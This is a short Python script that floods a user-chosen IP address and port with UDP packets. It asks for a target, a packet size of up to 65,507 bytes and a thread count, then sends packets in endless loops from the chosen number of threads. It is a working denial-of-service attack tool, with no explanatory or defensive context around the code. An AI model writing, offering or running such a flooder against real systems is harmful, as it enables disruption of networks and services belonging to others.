import socket
import threading

def send_packets(ip, port, packet_size):
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Create the packet with specified size
    packet = b'A' * packet_size  # Fill the packet with 'A's

    try:
        while True:
            # Send the packet to the specified IP and port
            sock.sendto(packet, (ip, port))
            print(f"Sent packet of size {packet_size} bytes to {ip}:{port}")
    except KeyboardInterrupt:
        print("Packet sending stopped.")
    finally:
        sock.close()

def main():
    ip = input("Enter the target IP address: ")
    port = int(input("Enter the target port: "))
    packet_size = int(input("Enter the packet size in bytes: "))
    thread_count = int(input("Enter the number of threads to use: "))

    # Clamp packet size within the valid range
    if packet_size < 1:
        packet_size = 1
    elif packet_size > 65507:
        packet_size = 65507

    print(f"Clamped packet size to {packet_size} bytes.")

    # Create and start threads
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_packets, args=(ip, port, packet_size))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish (this will not happen in this infinite loop)
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
